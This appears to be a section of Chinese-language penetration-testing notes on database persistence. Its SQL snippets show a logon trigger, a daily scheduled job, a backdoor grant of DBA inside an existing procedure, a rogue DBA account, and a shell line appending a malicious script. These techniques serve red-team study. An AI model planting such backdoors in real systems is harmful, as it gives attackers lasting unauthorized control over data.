## 持久化

### 触发器

```sql
CREATE OR REPLACE TRIGGER maintain_access_trigger
AFTER LOGON ON DATABASE
BEGIN
   EXECUTE IMMEDIATE 'CREATE OR REPLACE FUNCTION ...';
   -- Additional malicious activity here
END;
```

### 预定工作

```sql
BEGIN
   DBMS_SCHEDULER.create_job (
      job_name        => 'maintain_access_job',
      job_type        => 'PLSQL_BLOCK',
      job_action      => 'BEGIN malicious_procedure; END;',
      start_date      => SYSTIMESTAMP,
      repeat_interval => 'FREQ=DAILY;',
      enabled         => TRUE);
END;
```

该作业每天都会执行该malicious_procedure程序

### 存储过程

```sql
CREATE OR REPLACE PROCEDURE existing_procedure AS
BEGIN
   -- Original code
   ...

   -- Malicious code
   execute_immediate 'GRANT DBA TO ATTACKER_USER';
END;
```

### 新建用户

```sql
CREATE USER rogue_account IDENTIFIED BY password;
GRANT DBA TO rogue_account;
```

### 修改现有二进制文件或脚本

```sql
# Attacker modifies a legitimate shell script to also call their malicious script
echo "/path/to/malicious_script.sh" >> /path/to/legitimate_script.sh
```
